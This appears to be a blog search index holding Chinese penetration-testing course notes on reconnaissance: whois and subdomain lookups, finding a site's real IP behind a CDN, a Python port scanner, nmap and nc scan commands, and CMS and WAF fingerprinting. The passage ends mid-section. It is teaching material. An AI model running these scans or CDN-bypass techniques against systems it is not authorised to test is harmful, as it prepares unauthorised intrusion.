<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/9-xin-xi-shou-ji/xin-xi-shou-ji/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/9-xin-xi-shou-ji/xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集概述"><a href="#信息收集概述" class="headerlink" title="信息收集概述"></a>信息收集概述</h1><h2 id="渗透测试的主要流程"><a href="#渗透测试的主要流程" class="headerlink" title="渗透测试的主要流程"></a>渗透测试的主要流程</h2><ul><li>确定目标 </li><li>信息收集 </li><li>漏洞扫描 </li><li>漏洞利用 </li><li>形成报告</li></ul><h2 id="渗透测试的重要性"><a href="#渗透测试的重要性" class="headerlink" title="渗透测试的重要性"></a>渗透测试的重要性</h2><p>影响后续流程的效果 </p><h2 id="包括内容"><a href="#包括内容" class="headerlink" title="包括内容"></a>包括内容</h2><ol><li>域名相关信息 </li><li>IP相关信息 </li><li>端口服务相关信息</li><li>指纹识别（CMS/CDF/WAF）</li><li>Google Hacking </li><li>目录扫描 </li><li>Git Hack</li></ol><h2 id="学习框架"><a href="#学习框架" class="headerlink" title="学习框架"></a>学习框架</h2><ol><li>这种信息是什么？</li><li>怎么收集这种信息？ </li><li>收集这种信息有什么用？</li></ol><h1 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h1><h2 id="域名是什么"><a href="#域名是什么" class="headerlink" title="域名是什么"></a>域名是什么</h2><p>用来代替IP，找到网络上的一台计算机</p><p><a href="http://www.baldu.com/">www.baldu.com</a> –&gt;域名解析服务 –&gt; 220.181.38.148</p><h2 id="域名的分类"><a href="#域名的分类" class="headerlink" title="域名的分类"></a>域名的分类</h2><h3 id="国际域名"><a href="#国际域名" class="headerlink" title="国际域名"></a>国际域名</h3><ul><li>.com(商业公司)</li><li>.net(网络服务)</li><li>.org(组织协会等)</li><li>.gov(政府部 门)</li><li>.edu(教育机构)</li><li>.mil(军事领域)</li><li>.int(国际组织)</li></ul><h3 id="国别域名"><a href="#国别域名" class="headerlink" title="国别域名"></a>国别域名</h3><ul><li>.CN代表中国</li><li>.UK代表英国</li><li>.US代表美国</li></ul><h3 id="新顶级域名"><a href="#新顶级域名" class="headerlink" title="新顶级域名"></a>新顶级域名</h3><ul><li>biz</li><li>info</li><li>name</li><li>pro</li><li>aero</li><li>coop</li><li>museum</li><li>……</li></ul><h2 id="域名联系人信息"><a href="#域名联系人信息" class="headerlink" title="域名联系人信息"></a>域名联系人信息</h2><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><ul><li>姓名</li><li>邮箱</li><li>信息</li><li>电话</li><li>地址</li></ul><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><ul><li><a href="https://whois.chinaz.com/">https://whois.chinaz.com</a></li><li><a href="http://whoissoft.com/">http://whoissoft.com/</a></li><li><a href="https://whois.cnnic.cn/WelcomeServlet">https://whois.cnnic.cn/WelcomeServlet</a></li><li>kali自带了<code>whois</code>命令</li></ul><h3 id="域名反查"><a href="#域名反查" class="headerlink" title="域名反查"></a>域名反查</h3><ul><li><a href="http://whois.chinaz.com/reverse">http://whois.chinaz.com/reverse</a></li><li><a href="http://mwhois.chinaz.com/">http://mwhois.chinaz.com/</a></li></ul><h3 id="ICP备案"><a href="#ICP备案" class="headerlink" title="ICP备案"></a>ICP备案</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>所有服务器或者虚拟主机放在大陆的网站，域名必须要在<strong>工信部</strong>的系统里面<strong>备案</strong>，否则不能通过域名访问</p><h4 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h4><ul><li>姓名</li><li>备案号</li><li>邮箱</li></ul><h4 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h4><ul><li><a href="https://beian.mit.gov.cn/">https://beian.mit.gov.cn/</a></li><li><a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></li><li><a href="https://www.beian88.com/">https://www.beian88.com/</a></li></ul><h3 id="企业信息查询"><a href="#企业信息查询" class="headerlink" title="企业信息查询"></a>企业信息查询</h3><ul><li><p>天眼查</p></li><li><p>企查查</p></li><li><p>国家企业信用信息公示系统</p><p><a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a></p></li></ul><h2 id="子域名信息"><a href="#子域名信息" class="headerlink" title="子域名信息"></a>子域名信息</h2><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ul><li>字典</li><li>枚举</li></ul><h3 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h3><ul><li>Layer</li><li><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></li><li><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li><li><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li></ul><h2 id="域名DNS信息"><a href="#域名DNS信息" class="headerlink" title="域名DNS信息"></a>域名DNS信息</h2><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><ul><li>域名商，指定DNS服务器</li></ul><p><img src="/assets/image-20221129095350108.png" alt="image-20221129095350108"></p><ul><li>DNS服务商，指定记录</li></ul><p><img src="/assets/image-20221129095550378.png" alt="image-20221129095550378"></p><h4 id="记录类别"><a href="#记录类别" class="headerlink" title="记录类别"></a>记录类别</h4><p><img src="/assets/image-20221129095627979.png" alt="image-20221129095627979"></p><h4 id="工具-3"><a href="#工具-3" class="headerlink" title="工具"></a>工具</h4><ul><li><p><a href="http://dbcha.com/">http://dbcha.com/</a></p></li><li><p><a href="https://sitereport.netcraft.com/">https://sitereport.netcraft.com/</a></p></li><li><p><a href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a></p></li><li><p>kali命令</p></li></ul><p><code>host baidu.com</code></p><p><code>dig baidu.com</code></p><h1 id="IP信息"><a href="#IP信息" class="headerlink" title="IP信息"></a>IP信息</h1><h2 id="如何根据域名获得IP"><a href="#如何根据域名获得IP" class="headerlink" title="如何根据域名获得IP"></a>如何根据域名获得IP</h2><h3 id="DNS服务器类型"><a href="#DNS服务器类型" class="headerlink" title="DNS服务器类型"></a>DNS服务器类型</h3><ul><li>本地域名服务器</li><li>根域名服务器</li><li>顶级域名服务器 (Top Level DNS, TLD)</li><li>授权域名服务器</li></ul><h3 id="工具-4"><a href="#工具-4" class="headerlink" title="工具"></a>工具</h3><ul><li>ping</li></ul><p><code>man ping</code></p><ul><li>nslookup</li></ul><p><code>nslookup -type="MX" baidu.com</code></p><h3 id="IP归属"><a href="#IP归属" class="headerlink" title="IP归属"></a>IP归属</h3><p><a href="http://ipwhois.cnnic.net.cn/">http://ipwhois.cnnic.net.cn/</a></p><h2 id="如何获得CDN被后的真实IP"><a href="#如何获得CDN被后的真实IP" class="headerlink" title="如何获得CDN被后的真实IP"></a>如何获得CDN被后的真实IP</h2><h3 id="什么是CDN"><a href="#什么是CDN" class="headerlink" title="什么是CDN"></a>什么是CDN</h3><p>Content Delivery Network一内容分发网络</p><p>让在各个不同的地点的网络用户，都可以迅速访问到网站提供的内容</p><h3 id="常见厂商"><a href="#常见厂商" class="headerlink" title="常见厂商"></a>常见厂商</h3><p>CloudFlare/CofrF.o…..</p><p>帝联/蓝讯/网宿/七牛云/腾讯/百度/阿里…..</p><h3 id="CDN工作流程"><a href="#CDN工作流程" class="headerlink" title="CDN工作流程"></a>CDN工作流程</h3><ul><li>当终端用户(北京)向<a href="http://www.a.com下的指定资源发起请求时,首先向ldns/">www.a.com下的指定资源发起请求时，首先向LDNS</a> (本地DNS)发起域名解析请求。\</li><li>LDNS检查缓存中是否有<a href="http://www.a.com的ip地址记录.如果有,则直接返回给终端用户;如果没有,则向授权dns查询./">www.a.com的IP地址记录。如果有，则直接返回给终端用户;如果没有，则向授权DNS查询。</a></li><li>当授权DNS解析<a href="http://www.a.com时,返回域名cname/">www.a.com时，返回域名CNAME</a> <a href="http://www.a/">www.a</a>. tbcdn.com对应IP地址。</li><li>域名解析请求发送至阿里云DNS调度系统， 并为请求分配最佳节点IP地址。</li><li>LDNS获取DNS返回的解析IP地址。</li><li>用户获取解析IP地址。</li><li>用户向获取的IP地址发起对该资源的访问请求。</li></ul><h3 id="如何获取真实IP"><a href="#如何获取真实IP" class="headerlink" title="如何获取真实IP"></a>如何获取真实IP</h3><h4 id="查看IP数量"><a href="#查看IP数量" class="headerlink" title="查看IP数量"></a>查看IP数量</h4><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p><p>nslookup</p><h4 id="历史DNS"><a href="#历史DNS" class="headerlink" title="历史DNS"></a>历史DNS</h4><p><a href="http://dnshistory.org/">http://dnshistory.org/</a></p><p><a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a></p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p><p><a href="https://github.com/vincentcox/bypass-firewalls-by-DNS-history">https://github.com/vincentcox/bypass-firewalls-by-DNS-history</a></p><h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h4><h4 id="国外主机解析"><a href="#国外主机解析" class="headerlink" title="国外主机解析"></a>国外主机解析</h4><p><a href="https://asm.ca.com/zh_cn/ping.php">https://asm.ca.com/zh_cn/ping.php</a></p><p><a href="http://host-tracker.com/">http://host-tracker.com/</a></p><p><a href="http://www.webpagetest.org/">http://www.webpagetest.org/</a></p><p><a href="https://dnscheck.pingdom.com/">https://dnscheck.pingdom.com/</a></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li><p>网络空间搜索引擎</p><ul><li><p>fofa</p></li><li><p>censys</p></li></ul></li><li><p>邮件</p></li><li><p>手机APP抓包</p></li><li><p>微信服务号抓包</p></li><li><p>……</p></li></ul><h1 id="端口服务信息"><a href="#端口服务信息" class="headerlink" title="端口服务信息"></a>端口服务信息</h1><h2 id="扫描的思路"><a href="#扫描的思路" class="headerlink" title="扫描的思路"></a>扫描的思路</h2><p>一个服务一个端口 </p><h3 id="本机端口"><a href="#本机端口" class="headerlink" title="本机端口"></a>本机端口</h3><ul><li>windows</li></ul><p><code>netstat -aon|findstr 3306</code> </p><ul><li>Linux</li></ul><p><code>netstat -an|grep 3306</code> </p><h3 id="远程机器端口"><a href="#远程机器端口" class="headerlink" title="远程机器端口"></a>远程机器端口</h3><p><code>telnet 192.168.142.137 80</code> </p><p><code>wget 192.168.142.137 80</code> </p><p><code>nc -vz 192.168.142.137 445</code> </p><p><code>nc -vz 192.168.142.137 80-9000</code></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>wscan.py </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span> threading<span class="token keyword">def</span> <span class="token function">TCP_connect</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port_number<span class="token punctuation">,</span> delay<span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">:</span>    TCPsock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    TCPsock<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    TCPsock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span>delay<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        TCPsock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port_number<span class="token punctuation">)</span><span class="token punctuation">)</span>        output<span class="token punctuation">[</span>port_number<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Listening'</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        output<span class="token punctuation">[</span>port_number<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">def</span> <span class="token function">scan_ports</span><span class="token punctuation">(</span>host_ip<span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">:</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># To run TCP_connect concurrently</span>    output <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>         <span class="token comment"># For printing purposes</span>    <span class="token comment"># Spawning threads to scan ports</span>    <span class="token comment"># 先扫10000个端口</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>TCP_connect<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>host_ip<span class="token punctuation">,</span> i<span class="token punctuation">,</span> delay<span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">)</span>        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token comment"># Starting threads</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># Locking the script until all threads complete</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># Printing listening ports from small to large</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> output<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Listening'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    host_ip <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Please enter host IP: "</span><span class="token punctuation">)</span>    <span class="token comment"># 超时抛出异常</span>    delay <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"How many seconds the socket is going to wait until timeout: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       scan_ports<span class="token punctuation">(</span>host_ip<span class="token punctuation">,</span> delay<span class="token punctuation">)</span>    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Press Any Key to Exit"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h2><h3 id="文件共享服务"><a href="#文件共享服务" class="headerlink" title="文件共享服务"></a>文件共享服务</h3><ul><li>21/22/69 FTP/SFTP文件传输协议</li><li>2049 NFS服务（Network File System）</li><li>139 Samba服务</li><li>389  LDAP目录访问协议（Light Directory Access Portocol）</li></ul><h3 id="远程连接服务"><a href="#远程连接服务" class="headerlink" title="远程连接服务"></a>远程连接服务</h3><ul><li>22 SSH远程连接 </li><li>23 Telnet远程连接</li><li>3389 RDP远程桌面连接</li><li>5900 VNC远程连接</li><li>5632 PcAnywhere远程控制服务</li><li></li></ul><h3 id="Web应用服务"><a href="#Web应用服务" class="headerlink" title="Web应用服务"></a>Web应用服务</h3><ul><li>80/443/8080  常见的web服务端口</li><li>7001/7002 Weblogic控制台</li><li>8080/8089 Jboss/resin/jetty/Jenkins</li><li>9090 Websphere控制台</li><li>4848 Glassfish控制台</li><li>1352  Lotus domino邮件服务</li><li>10000 Webmin-web控制面板</li></ul><h3 id="数据库服务"><a href="#数据库服务" class="headerlink" title="数据库服务"></a>数据库服务</h3><ul><li>3306  MySQL</li><li>1433 MSSQL数据库</li><li>1521 Oracle数据库</li><li>5432 PostgreSQL数据库</li><li>27017/27018 MongoDB</li><li>6379  Redis数据库</li><li>5000 Sysbase/DB2数据库</li></ul><h3 id="邮件服务"><a href="#邮件服务" class="headerlink" title="邮件服务"></a>邮件服务</h3><ul><li>25 SMTP邮件服务</li><li>110  POP3协议</li><li>143 IMAP协议</li></ul><h3 id="网络常见协议"><a href="#网络常见协议" class="headerlink" title="网络常见协议"></a>网络常见协议</h3><ul><li>53 DNS域名系统</li><li>67/68 DHCP服务</li><li>161  SNMP协议</li></ul><h3 id="特殊服务"><a href="#特殊服务" class="headerlink" title="特殊服务"></a>特殊服务</h3><ul><li>2181  Zookeeper服务</li><li>8069 Zabbix服务</li><li>9200/9300 Elasticsearch服务</li><li>11211 Memcached服务</li><li>512/513/514 Linux Rexec服务</li><li>873 Rsync服务</li><li>3690 SVN服务</li><li>50000 SAP Management Console</li></ul><h2 id="metasploitable2靶机"><a href="#metasploitable2靶机" class="headerlink" title="metasploitable2靶机"></a>metasploitable2靶机</h2><ul><li>下载、解压、导入VM </li><li>默认用户名密码:msfadmin/msfadmin </li><li>修改root密码 <code>sudo passwd root</code> </li><li><code>ifconfig</code>查看IP</li></ul><h2 id="扫描工具NMap"><a href="#扫描工具NMap" class="headerlink" title="扫描工具NMap"></a>扫描工具NMap</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><ul><li>Network Mapper</li></ul><p> <a href="https://nmap.org/">https://nmap.org/</a></p><ul><li>图形界面</li></ul><p>zenmap </p><ul><li><p>主要功能 </p><ol><li><p>扫描主机(Host Discovery) </p></li><li><p>扫描端口(Port Scanning) </p></li><li><p>探测操作系统、软件版本 (Operating System Detection、Version Detection)</p></li></ol></li></ul><h3 id="参数分类"><a href="#参数分类" class="headerlink" title="参数分类"></a>参数分类</h3><ul><li><a href="https://nmap.org/book/man.html">https://nmap.org/book/man.html</a></li><li>TARGET SPECIFICATION:目标，对什么进行扫 描，比如是域名、IP或者网络 </li><li>HOST DISCOVERY:主机发现，怎么对主机进行 扫描，比如简单扫描，还是全部扫一遍，或者用 相应的协议扫 </li><li>SCAN TECHNIQUES:扫描技术，协议的设置 </li><li>PORT SPECIFICATION AND SCAN ORDER:端 口和扫描顺序设置 </li><li>SERVICE/VERSION DETECTION:服务和版本识 别 </li><li>SCRIPT SCAN:使用脚本，nmap本身内置了大量的lua脚本，而且还可以自己编写脚本 </li><li>OS DETECTION:操作系统识别 </li><li>TIMING AND PERFORMANCE:时间和性能设置，比如扫描频率、重试次数等等 </li><li>FIREWALL/IDS EVASION AND SPOOFING:防火 墙绕过和欺骗，比如使用代理，假IP等 </li><li>OUTPUT:把扫描接出输出到文件 </li><li>MISC: 杂项：启用IPv6等等配置</li></ul><h3 id="参数示例"><a href="#参数示例" class="headerlink" title="参数示例"></a>参数示例</h3><h4 id="不带参数"><a href="#不带参数" class="headerlink" title="不带参数"></a>不带参数</h4><p><code>nmap 192.168.142.137</code> </p><p><code>nmap testfire.net</code> </p><h4 id="简单扫描"><a href="#简单扫描" class="headerlink" title="简单扫描"></a>简单扫描</h4><p><code>nmap -sP 192.168.142.1370</code> </p><h4 id="指定端口或范围扫描"><a href="#指定端口或范围扫描" class="headerlink" title="指定端口或范围扫描"></a>指定端口或范围扫描</h4><p><code>nmap -p0-65535 192.168.142.137</code> </p><h4 id="探测操作系统："><a href="#探测操作系统：" class="headerlink" title="探测操作系统："></a>探测操作系统：</h4><p><code>nmap -O 192.168.142.137</code> </p><h4 id="只进行主机发现，不进行端口扫描"><a href="#只进行主机发现，不进行端口扫描" class="headerlink" title="只进行主机发现，不进行端口扫描"></a>只进行主机发现，不进行端口扫描</h4><p><code>nmap -sn 192.168.40.195/24</code></p><h3 id="界面工具Zenmap"><a href="#界面工具Zenmap" class="headerlink" title="界面工具Zenmap"></a>界面工具Zenmap</h3><ul><li>第一种：Intense scan </li><li>第二种：Intense scan plus UDP </li><li>第三种：Intense scan,all TCP ports </li><li>第四种：Intense scan,no ping </li><li>第五种：Ping scan </li><li>第六种：Quick scan </li><li>第七种：Quick scan plus </li><li>第八种：Quick traceroute </li><li>第九种：Regular scan </li><li>第十种：Slow comprehensive scan</li></ul><h4 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h4><ul><li>masscan、nbtscan </li><li><a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></li></ul><h1 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="CMS指纹识别"></a>CMS指纹识别</h1><h2 id="1、什么是指纹识别？"><a href="#1、什么是指纹识别？" class="headerlink" title="1、什么是指纹识别？"></a>1、什么是指纹识别？</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>根据关键特征，识别程序名称、版本等信息 </p><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><ol><li>CMS信息：比如Discuz、织梦、帝国CMS、 PHPCMS、ECshop等； </li><li>前端技术：比如HTML5、jquery、 bootstrap、Vue、ace等； </li><li>开发语言：比如PHP、Java、Ruby、 Python、C#等； </li><li>Web服务器：比如Apache、 Nginx,、IIS、 lighttpd等；</li><li>应用服务器：比如Tomcat、Jboss、 Weblogic、Websphere等； </li><li>操作系统信息：比如Linux、win2k8、 win7、Kali、Centos等； </li><li>CDN信息：是否使用CDN，如cloudflare、 帝联、蓝讯、网宿、七牛云、阿里云等； </li><li>WAF信息：是否使用WAF，如D盾、云锁、 宝塔、安全狗、360等</li></ol><h2 id="2、什么是CMS？"><a href="#2、什么是CMS？" class="headerlink" title="2、什么是CMS？"></a>2、什么是CMS？</h2><p>Content Management System </p><p>内容管理系统 </p><h3 id="常见CMS"><a href="#常见CMS" class="headerlink" title="常见CMS"></a>常见CMS</h3><ul><li>企业建站系统：MetInfo(米拓)、蝉知、 SiteServer CMS等; </li><li>B2C商城系统：商派Shopex、ECshop、 HiShop、XpShop等;</li><li>门户建站系统：DedeCMS(织梦)、帝国CMS、 PHPCMS、动易、CmsTop等; </li><li>博客系统：WordPress、Z-Blog等; </li><li>论坛社区：Discuz、PHPwind、WeCenter等; 问答系统：Tipask、whatsns等; </li><li>知识百科系统：HDwiki; B2B门户系统：Destoon、B2Bbuilder、友邻 B2B等; </li><li>人才招聘网站系统：骑士CMS、PHP云人才管理 系统; </li><li>房产网站系统：FangCms等; </li><li>在线教育建站系统：Kesion、EduSoho; </li><li>电影网站系统：苹果CMS、ctcms、movcms等; </li><li>小说文学建站系统：杰奇CMS;</li></ul><h2 id="3、CMS指纹识别的思路"><a href="#3、CMS指纹识别的思路" class="headerlink" title="3、CMS指纹识别的思路"></a>3、CMS指纹识别的思路</h2><h4 id="版权信息"><a href="#版权信息" class="headerlink" title="版权信息"></a>版权信息</h4><p>Powered by XXX </p><h4 id="特定的文件MD5"><a href="#特定的文件MD5" class="headerlink" title="特定的文件MD5"></a>特定的文件MD5</h4><p><a href="https://github.com/Lucifer1993/cmsprint">https://github.com/Lucifer1993/cmsprint</a> </p><h4 id="查看网页源码"><a href="#查看网页源码" class="headerlink" title="查看网页源码"></a>查看网页源码</h4><p>分析特定的路径或者代码内容 </p><h4 id="特定文件"><a href="#特定文件" class="headerlink" title="特定文件"></a>特定文件</h4><p>比如robots.txt</p><h2 id="4、CMS指纹识别的工具"><a href="#4、CMS指纹识别的工具" class="headerlink" title="4、CMS指纹识别的工具"></a>4、CMS指纹识别的工具</h2><h3 id="Kali自带工具"><a href="#Kali自带工具" class="headerlink" title="Kali自带工具"></a>Kali自带工具</h3><h4 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h4><p><code>whatweb -v www.discuz.net</code> </p><h3 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><h4 id="whatruns"><a href="#whatruns" class="headerlink" title="whatruns"></a>whatruns</h4><p><a href="https://www.whatruns.com/">https://www.whatruns.com/</a> </p><h4 id="Wappalyzer"><a href="#Wappalyzer" class="headerlink" title="Wappalyzer"></a>Wappalyzer</h4><p><a href="https://www.wappalyzer.com/">https://www.wappalyzer.com</a> </p><h3 id="在线网站"><a href="#在线网站" class="headerlink" title="在线网站"></a>在线网站</h3><ul><li><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a> </li><li><a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></li></ul><h3 id="离线工具"><a href="#离线工具" class="headerlink" title="离线工具"></a>离线工具</h3><ul><li>御剑指纹扫描器（需要.NET Framework） </li><li>Test404轻量CMS指纹识别</li></ul><h3 id="其他开源程序"><a href="#其他开源程序" class="headerlink" title="其他开源程序"></a>其他开源程序</h3><p><a href="https://github.com/Tuhinshubhra/CMSeek">https://github.com/Tuhinshubhra/CMSeek</a></p><h1 id="CDN指纹识别"><a href="#CDN指纹识别" class="headerlink" title="CDN指纹识别"></a>CDN指纹识别</h1><h2 id="1、CDN指纹识别思路"><a href="#1、CDN指纹识别思路" class="headerlink" title="1、CDN指纹识别思路"></a>1、CDN指纹识别思路</h2><h3 id="如何找出真实IP"><a href="#如何找出真实IP" class="headerlink" title="如何找出真实IP"></a>如何找出真实IP</h3><ul><li>超级ping </li><li>历史DNS </li><li>通过子域名查询IP</li><li>国外主机解析 </li><li>其他</li></ul><h3 id="CDN如何配置"><a href="#CDN如何配置" class="headerlink" title="CDN如何配置"></a>CDN如何配置</h3><ul><li>通过配置CNAME（别名记录） </li><li><a href="https://help.aliyun.com/document_detail/27144.html">https://help.aliyun.com/document_detail/27144.html</a></li></ul><h2 id="2、CDN指纹识别工具"><a href="#2、CDN指纹识别工具" class="headerlink" title="2、CDN指纹识别工具"></a>2、CDN指纹识别工具</h2><h3 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h3><h4 id="kali自带lbd"><a href="#kali自带lbd" class="headerlink" title="kali自带lbd"></a>kali自带lbd</h4><p><code>ldb www.12306.cn</code> </p><p><code>load balance detector</code> </p><h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h4><p><code>ping www.alibaba.com</code> </p><h4 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h4><p><code>nslookup www.bilibili.com</code> </p><h4 id="超级ping"><a href="#超级ping" class="headerlink" title="超级ping"></a>超级ping</h4><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com</a> </p><h4 id="专用识别工具"><a href="#专用识别工具" class="headerlink" title="专用识别工具"></a>专用识别工具</h4><ul><li><a href="http://cdn.chinaz.com/">http://cdn.chinaz.com/</a> </li><li><a href="https://www.cdnplanet.com/tools/cdnfinder/">https://www.cdnplanet.com/tools/cdnfinder/</a></li></ul><h4 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h4><ul><li><a href="https://github.com/boy-hack/w8fuckcdn/">https://github.com/boy-hack/w8fuckcdn/</a> </li><li><a href="https://github.com/3xp10it/xcdn">https://github.com/3xp10it/xcdn</a></li></ul><h1 id="WAF指纹识别"><a href="#WAF指纹识别" class="headerlink" title="WAF指纹识别"></a>WAF指纹识别</h1><h2 id="什么是WAF"><a href="#什么是WAF" class="headerlink" title="什么是WAF"></a>什么是WAF</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>WAF Web Application Firewall </p><p>Web 应用防火墙 </p><p>过滤HTTP或者HTTPS的请求，识别并拦截恶意 的请求  </p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul><li>硬件型 WAF</li><li>云 WAF</li><li>软件型 WAF</li></ul><h2 id="常见WAF厂商"><a href="#常见WAF厂商" class="headerlink" title="常见WAF厂商"></a>常见WAF厂商</h2><ul><li>各种云：阿里云、腾讯云、华为云、百度云…… </li><li>安全狗、宝塔、360、知道创宇、长亭、安恒…</li></ul><h2 id="WAF的识别思路"><a href="#WAF的识别思路" class="headerlink" title="WAF的识别思路"></a>WAF的识别思路</h2><h3 id="方法-1"><a href="#方法-1" class="headerlink" 